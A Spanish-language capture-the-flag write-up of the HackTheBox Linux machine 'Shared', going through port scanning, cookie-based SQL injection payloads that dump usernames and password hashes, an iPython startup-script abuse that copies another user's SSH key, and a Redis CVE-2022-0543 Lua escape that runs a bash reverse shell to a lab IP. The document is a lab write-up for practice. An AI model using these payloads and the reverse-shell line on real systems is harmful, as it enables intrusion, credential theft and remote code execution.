---
layout      : post
title       : "Shared - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/Shared-HackTheBox/Shared.webp
category    : [ htb ]
tags        : [ Linux ]
---

⚔️En esta máquina Linux de nivel medio tocaremos sqli para obtener credenciales y conectarnos por ssh y posteriormente escalaremos con ipython al usuario dan y a través de redis al usuario root⚔️.

🎥Canal Writeups Youtube🎬 --> [https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ](https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ)

![](/assets/images/HTB/Shared-HackTheBox/shared2.webp)

![](/assets/images/HTB/Shared-HackTheBox/shared-rating.webp)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)


***


**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
    * [Reconocimiento de Puertos](#recon-nmap).
2. [Enumeración](#enumeración).
    * [Enumeración Web](#enum-web).
3. [Explotación](#explotación).
    * [Inyección SQL](#sqli).
4. [Escalada de Privilegios](#privesc). 
    * [iPython](#iPython).
    * [Redis cli](#redis).
    
    
***


# Reconocimiento [#](reconocimiento) {#reconocimiento}

***

## Reconocimiento de Puertos [🔍](#recon-nmap) {#recon-nmap}

Como siempre comienzo con el reconocimiento, pero antes de lanzar la utilidad nmap, lanzo el <span style="color:red"> script Whichsystem.py </span> que me sirve para identificar el sistema operativo de la máquina a la que me voy a enfrentar.

Esta heramienta creada por s4vitar se basa en el ttl (time to live) para identificar si es una máquina que corre un sistema operativo Linux o Windows.

| TTL    | Sistema Operativo | 
| :----- | :------- | 
| 64     | Linux    | 
| 128    | Windows  |

![](/assets/images/HTB/Shared-HackTheBox/whichsystem1.webp)

En este caso me arroja un TTL de 63, por lo que al acercarse más a 64 que a 128 ya sé que es una máquina Linux.

Una vez que ya se que es una máquina Linux puedo proceder al reconocimiento de puertos.

```bash
# Primer escaneo para sacar los puertos abiertos de la máquina
--------------------------------------------------------------
nmap -p- -Pn -n --min-rate 5000 10.10.11.186 --open -vvv
```

![](/assets/images/HTB/Shared-HackTheBox/nmap1.webp)


```bash
# Segundo escaneo para sacar la versión de lo que se ejecuta en cada puerto y lanzamiento de una serie de scripts básicos de nmap contra dichos puertos.
--------------------------------------------------------------
nmap -p80,22,21 -sCV -n 10.10.11.186
```

![](/assets/images/HTB/Shared-HackTheBox/nmap2.webp)

Por el momento tengo la siguiente información:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | ssh      | OpenSSH 8.4p1 Debian |
| 80     | http     | nginx 1.18.0 |
| 443    | https    | nginx 1.18.0 |

> Dominio <span style="color:red">shared.htb</span> que añado al archivo /etc/hosts de mi máquina atacante.


# Enumeración [#](enumeración) {#enumeración}

***

## Enumeración Web [🔢](#enum-web) {#enum-web}

Antes de acceder al navegador y ver que tenemos en el servidor web del puerto 80 voy a lanzar la herramienta whatweb para ver que información me reporta y si me puede ser útil.

![](/assets/images/HTB/Shared-HackTheBox/whatweb.webp)

Veo que tenemos una cookie... eso ya es una gran pista... pero bueno ahí lo dejo :)

Abro el navegador y encuentro una web que parece de una tienda de ropa, arte y accesorios del hogar.

Pruebo a añadir algún producto al carrito y veo que soy redirigido a un subdominio...

![](/assets/images/HTB/Shared-HackTheBox/subdominio.webp)

> <span style="color:red">checkout.shared.htb</span>

Pero a simple vista no veo nada interesante... asique abro el inspeccionar del navegador para ver que puedo hacer con esa cookie que descubrí anteriormente... Y veo que arrastro una cookie con el id del producto que añadí a la cesta.

![](/assets/images/HTB/Shared-HackTheBox/cookie.webp)

Pruebo a meter una serie de inyecciones sql con éxito.

# Explotación [#](explotación) {#explotación}

***

## Inyección SQL [💉](sqli) {#sqli}

```bash
# Primero he de descubrir el nombre de la base de datos
=======================================================
{"' and 0=1 union select 1,database(),3-- -":"1"}
```

![](/assets/images/HTB/Shared-HackTheBox/sqli1.webp)

```bash
# A continuación intentaré listar las tablas existentes dentro de la base de datos checkout
===========================================================================================
{"' and 0=1 union select 1,table_name,table_schema from information_schema.tables where table_schema='checkout'-- -":"1"}
```

![](/assets/images/HTB/Shared-HackTheBox/sqli2.webp)

Puedo ver que existe una columna con el nombre de users, por lo que ahora me toca leer las columnas de la tabla users.

```bash
# Listar columnas de la tabla users de la base de datos checkout
==================================================================
{"' and 0=1 union select 1,username,2 from checkout.user-- -":"1"}
```

![](/assets/images/HTB/Shared-HackTheBox/sqli3.webp)

Encuentro el usuario james_mason, ahora toca intentar obtener su contraseña usando la misma inyección que para el usuario pero modificando el campo user por password.

```bash
# Obtener contraseña del usuario james_mason
==================================================================
{"' and 0=1 union select 1,password,2 from checkout.user-- -":"1"}
```

![](/assets/images/HTB/Shared-HackTheBox/sqli4.webp)

Encuentro la contraseña codificada del usuario james_mason, por lo que he de craquearla.

En esta ocasión usaré una herramienta online muy famosa.

[https://crackstation.net/](https://crackstation.net/)

![](/assets/images/HTB/Shared-HackTheBox/password_cracked.webp)

Y consigo la contraseña en texto plano.

Ahora pruebo a loguearme con el usuario james y la contraseña en el servicio ssh y consigo acceso.

# Escalada de Privilegios [#](privesc) {#privesc}

***

## iPython [👨‍💻](#iPython) {#iPython}

A continuación toca realizar movimiento horizontal al usaurio dan_smith para poder leer la flag user.txt y continuar para posteriormente escalar al usuario root.

Lo primero que se me ocurre es lanzar el binario linpeas.sh para buscar posibles vulnerabilidades, malas configuraciones... etc

```bash
# Veo que el usuario james_mason pertenece al grupo developer
=============================================================
uid=1000(james_mason) gid=1000(james_mason) groups=1000 (james_mason),1001(developer)
```

También encuentro algo más curioso aún... tenemos el puerto 6379 corriendo en local (el puerto 6379 suele ser redis).

![](/assets/images/HTB/Shared-HackTheBox/redis.webp)

Pero por el momento no he encontrado nada útil... asique lanzo pspy64 para buscar procesos que se ejecuten ocultos.

![](/assets/images/HTB/Shared-HackTheBox/pspy64.webp)

Veo que se ejecutan ciertas cosas bajo el UID 1001 (developer) tirando del comando ipython...

Asique me pongo a buscar vulnerabilidades de ipython o algún tipo de escalada de privilegios y encuentro el siguiente repositorio de github.

[https://github.com/advisories/GHSA-pq7m-3gw7-gq5x](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x)

```bash
# Sigo los pasos para intentar leer la clave rsa del usuario dan_smith.
=======================================================================
mkdir -m 777 /opt/scripts_review/profile_default/
mkdir -m 777 /opt/scripts_review/profile_default/startup
echo "import os;os.system('cat ~/.ssh/id_rsa > ~/dan_smith.key')" > /opt/scripts_review/profile_default/startup/elc4br4.py
# Debemos ejecutar rápidamente estos 3 comandos, sino no funcionará.
```

![](/assets/images/HTB/Shared-HackTheBox/rsa.webp)

Ahora ya puedo loguearme a través del servicio ssh con el usuario dan_smith usando su clave rsa.

## Redis-cli [👨‍💻](#redis) {#redis}

Ahora toca escalar privilegios para convertirme en el usuario root.

Antes al lanzar el binario linpeas descubrí que estaba Redis corriendo en el puerto 6379, por lo que podría ser un vector de escalada.

Pero para asegurarme 100 por 100 voy a volver a lanzar linpeas.

Y encuentro lo siguiente:

![](/assets/images/HTB/Shared-HackTheBox/linpeas.webp)

Esto ya me hace pensar que la escalada al usuario root va a ser a través de Redis.

Encuentro un archivo llamado redis_connector_dev y procedo a ejecutarlo:

![](/assets/images/HTB/Shared-HackTheBox/redis_connector_dev.webp)

Pero no veo nada de interés por lo que se me ocurre poner un netcat en escucha en el puerto 6379 y ejecuto el script que posteriormente me he descargado en máquina atacante.

![](/assets/images/HTB/Shared-HackTheBox/redis_connector_dev2.webp)

Y encuentro lo que parece una credencial del redis, pero sigo sin nada sólido más que esa credencial.

Por lo que decido buscar vulnerabilidades de redis y encuentro lo siguiente:

[https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md](https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md)

He de loguearme con redis-cli usando la contraseña que encontré, crear una rev shell en bash y ejecutar el siguiente comando:

```bash
# Reverse Shell Bash
echo "bash -i >& /dev/tcp/10.10.14.10/443 0>&1" > /tmp/shell
```
```bash
# Pongo netcat en escucha en el puerto 443
nc -lnvp 443
```

```bash
# Ejecuto Redis con la contraseña encontrada e introduzco el siguiente comando:
==============================================================================
redis-cli --pass F2WHqJUz2WEz=Gqq
==============================================================================
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /tmp/shell | bash"); local res = f:read("*a"); f:close(); return res' 
```

![](/assets/images/HTB/Shared-HackTheBox/root.webp)

Y por fin me he convertido en root y ya puedo leer la flag root.

![](/assets/images/HTB/Shared-HackTheBox/share.webp)

![](/assets/images/HTB/Shared-HackTheBox/gif.gif)



























